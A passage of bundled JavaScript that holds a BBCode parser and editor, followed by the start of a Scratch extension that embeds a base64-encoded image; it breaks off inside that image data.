        if ((ref = parent.children.slice(-1)[0]) != null ? ref.STRIP_OUTER : void 0) {
          text = text.replace(_START_NEWLINE_RE, "");
        }
        return new bbcode2.Tag(this.renderer, {
          text,
          parent
        });
      };
      Parser.prototype.parse = function(input, maxParsedable) {
        let cls;
        let current;
        let params;
        let root;
        let tag;
        let tagName;
        let token;
        let tokens;
        current = root = new bbcode2.Tag(this.renderer);
        tokens = input.split(_TOKEN_RE);
        let tagNumber = 0;
        let lastTag = null;
        while (tokens.length && tagNumber < maxParsedable) {
          tagNumber++;
          token = tokens.shift();
          if (token.match(_TOKEN_RE)) {
            params = this._parseParams(token.slice(1, -1));
            tagName = params[0][0];
            if (indexOf.call(current.CLOSED_BY, tagName) >= 0) {
              tokens.unshift(token);
              tagName = `/${current.name}`;
              params = [];
            }
            if (tagName[0] === "/") {
              tagName = tagName.slice(1);
              if (!(tagName in this.tags)) {
                this._createTextNode(current, token);
                continue;
              }
              if (current.name === tagName) {
                current = current.parent;
              }
            } else {
              cls = this.tags[tagName];
              if (!cls) {
                this._createTextNode(current, token);
                continue;
              }
              tag = new cls(this.renderer, {
                name: tagName,
                parent: current,
                params
              });
              if (!tag.SELF_CLOSE && (indexOf.call(tag.CLOSED_BY, tagName) < 0 || current.name !== tagName)) {
                current = tag;
              }
            }
          } else {
            this._createTextNode(current, token);
          }
        }
        return root;
      };
      Parser.prototype.toHTML = function(input, runtimes, maxParsedable) {
        let html;
        runtime = runtimes;
        return html = this.parse(input, maxParsedable).toHTML();
      };
      return Parser;
    }();
  }).call(obj);
  (function() {
    let MARKUP;
    let bbcode2;
    bbcode2 = this.bbcode;
    MARKUP = {
      bold: {
        keyCode: 66,
        title: "Bold (Ctrl+B)",
        placeholder: "bold text",
        open: "[b]",
        close: "[/b]"
      },
      italic: {
        keyCode: 73,
        title: "Italic (Ctrl+I)",
        placeholder: "italic text",
        open: "[i]",
        close: "[/i]"
      },
      center: {
        keyCode: 69,
        title: "Center (Ctrl+E)",
        placeholder: "center text",
        open: "[center]",
        close: "[/center]"
      },
      hyperlink: {
        keyCode: 76,
        title: "Hyperlink (Ctrl+L)",
        placeholder: "link text",
        open() {
          let url;
          url = prompt("Please enter the URL of your link", "http://") || "link url";
          return `[url=${url}]`;
        },
        close: "[/url]"
      },
      blockquote: {
        keyCode: 190,
        title: "Blockquote (Ctrl+.)",
        placeholder: "blockquote",
        open: "[quote]",
        close: "[/quote]"
      },
      code: {
        keyCode: 76,
        title: "Code (Ctrl+K)",
        placeholder: 'print("code sample");',
        open: "[code]",
        close: "[/code]"
      },
      image: {
        keyCode: 71,
        placeholder: "image url",
        open: "[img]",
        close: "[/img]"
      },
      nlist: {
        keyCode: 79,
        title: "Numbered List (Ctrl+O)",
        placeholder: "list item",
        open(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list=1\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "[list=1]\n	[*]";
          }
          return "	[*]";
        },
        close(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list=1\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "\n[/list]";
          }
        }
      },
      list: {
        keyCode: 85,
        title: "Bulleted List (Ctrl+O)",
        placeholder: "list item",
        open(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "[list]\n	[*]";
          }
          return "	[*]";
        },
        close(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "\n[/list]";
          }
        }
      },
      heading: {
        keyCode: 72,
        title: "Heading (Ctrl+H)",
        placeholder: "heading",
        open: "[h3]",
        close: "[/h3]",
        before: /\n$/,
        after: /^\n/
      },
      hrule: {
        keyCode: 82,
        title: "Hprizontal Rule (Ctrl+R)",
        open: "[hr]\n",
        before: /\n\n$/,
        after: /^\n\n/
      }
    };
    this.bbcode.Editor = function() {
      function Editor(textarea, markup) {
        this.markup = markup != null ? markup : MARKUP;
        this.$ = $(textarea);
        this.textarea = this.$[0];
        this.$.on(
          "keydown",
          /* @__PURE__ */ function(_this) {
            return function(e) {
              let end;
              let i;
              let len;
              let length;
              let line;
              let lines;
              let offset;
              let ref;
              let ref1;
              let ref2;
              let ref3;
              let selection;
              let start;
              let tab;
              if (e.which === 9) {
                selection = _this.getSelection();
                offset = 0;
                if (selection.start === selection.end && !e.shiftKey) {
                  offset++;
                  selection.value[1] = `	${selection.value[1]}`;
                  _this.setValue(selection.value.join(""));
                } else {
                  length = 0;
                  tab = false;
                  lines = [];
                  ref = _this.textarea.value.split("\n");
                  for (i = 0, len = ref.length; i < len; i++) {
                    line = ref[i];
                    ref1 = [length, length += line.length + 1], start = ref1[0], end = ref1[1];
                    if (!tab && start <= (ref2 = selection.start) && ref2 < end) {
                      tab = true;
                    }
                    if (tab) {
                      if (e.shiftKey) {
                        if (line[0] === "	") {
                          line = line.slice(1);
                          offset--;
                        }
                      } else {
                        line = `	${line}`;
                        offset++;
                      }
                      tab = !(start <= (ref3 = selection.end) && ref3 <= end);
                    }
                    lines.push(line);
                  }
                  _this.setValue(lines.join("\n"));
                }
                if (offset > 0) {
                  selection.start++;
                } else if (offset < 0) {
                  selection.start--;
                }
                _this.select(selection.start, selection.end + offset);
              } else if (!e.ctrlKey || e.altKey || _this.getRule(e.which) == null) {
                return true;
              } else {
                _this.replace(e.which);
              }
              return false;
            };
          }(this)
        );
      }
      Editor.prototype._escapeRe = function(pattern) {
        let escaped;
        let special;
        special = ["/", ".", "*", "+", "?", "|", "(", ")", "[", "]", "{", "}", "\\", "^", "$"];
        escaped = pattern.replace(new RegExp(`(\\${special.join("|\\")})`, "g"), "\\$1");
        return new RegExp(`^${escaped.replace(/\d+/, "\\d+")}$`);
      };
      Editor.prototype.getRule = function(keyCode) {
        let key;
        let ref;
        let rule;
        ref = this.markup;
        for (key in ref) {
          rule = ref[key];
          if (rule.keyCode === keyCode) {
            return rule;
          }
        }
      };
      Editor.prototype.replace = function(keyCode, value, text) {
        let close;
        let open;
        let replacement;
        let rule;
        let selection;
        let start;
        this.$.focus();
        selection = this.getSelection();
        rule = this.getRule(keyCode);
        value = this.textarea.value;
        open = (typeof rule.open === "function" ? rule.open(selection.value[0]) : rule.open) || "";
        close = (typeof rule.close === "function" ? rule.close(selection.value[2]) : rule.close) || "";
        if (this._escapeRe(open).test(value.slice(selection.start - open.length, selection.start)) && this._escapeRe(close).test(value.slice(selection.end, selection.end + close.length))) {
          start = selection.start - open.length;
          this.setValue(
            value.substr(0, start) + selection.value[1] + value.substr(selection.end + close.length, value.length)
          );
          return this.select(start, start + selection.value[1].length);
        }
        replacement = open + (text || selection.value[1] || rule.placeholder || "") + close;
        if (rule.before != null && !rule.before.test(selection.value[0])) {
          replacement = `

${replacement}`;
          selection.start += 2;
        }
        if (rule.after != null && !rule.after.test(selection.value[2])) {
          replacement += "\n\n";
          selection.end += 2;
        }
        this.setValue(selection.value[0] + replacement + selection.value[2]);
        return this.select(selection.start + open.length, selection.start + replacement.length - close.length);
      };
      Editor.prototype.setValue = function(value) {
        let position;
        position = this.$.scrollTop();
        this.$.val(value);
        return this.$.scrollTop(position);
      };
      Editor.prototype.select = function(start, end) {
        let range;
        let ref;
        if (((ref = document.selection) != null ? ref.createRange : void 0) != null) {
          range = this.textarea.createTextRange();
          range.collapse(true);
          range.moveStart("character", start);
          range.moveEnd("character", end - start);
          return range.select();
        }
        this.textarea.selectionStart = start;
        return this.textarea.selectionEnd = end;
      };
      Editor.prototype.getSelection = function() {
        let close;
        let end;
        let open;
        let range;
        let ref;
        let selection;
        let start;
        let storedRange;
        let value;
        value = this.textarea.value;
        if (((ref = document.selection) != null ? ref.createRange : void 0) != null) {
          selection = document.selection;
          if (!/testarea/i.test(this.textarea.tagName)) {
            range = selection.createRange().duplicate();
            range.moveEnd("character", value.length);
            start = range.text === "" ? value.length : value.lastIndexOf(range.text);
            range = selection.createRange().duplicate();
            range.moveStart("character", -value.length);
            end = range.text.length + 1;
          } else {
            range = selection.createRange();
            storedRange = range.duplicate();
            storedRange.moveToElementText(this.textarea);
            storedRange.setEndPoint("EndToEnd", range);
            start = storedRange.text.length - range.text.length;
            end = start + range.text.length;
          }
        } else {
          start = this.textarea.selectionStart;
          end = this.textarea.selectionEnd;
        }
        open = value.substring(0, start);
        close = value.substring(end, value.length);
        return selection = {
          start,
          end,
          value: [open, value.substring(start, end), close]
        };
      };
      return Editor;
    }();
  }).call(obj);
  var { bbcode } = obj;
  var bbcode_default = bbcode;

  // src/index.js
  var import_sweetalert2 = __toESM(require_sweetalert2_all());
  (function(Scratch2) {
    const BetterMsgPictureUrl = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB9YAAARoCAYAAABQVz+7AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAuIwAALiMBeKU/dgAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAACAASURBVHic7N1NluNG0x7QyARY1foW4uOR1+WteQtejMdegdVFAJkeZOKPxUZL75/UrHt12ARBEASLqNLgQUSk//u//+f/ipr+WwAAAAAAAAAAJ7XG/xmjpP8eKf7HX30wAAAAAAAAAPD3U9/yX30IAAAAAAAAAPB3JlgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAAAAAAAAC4IFgHAAAAAAAAgAuCdQAA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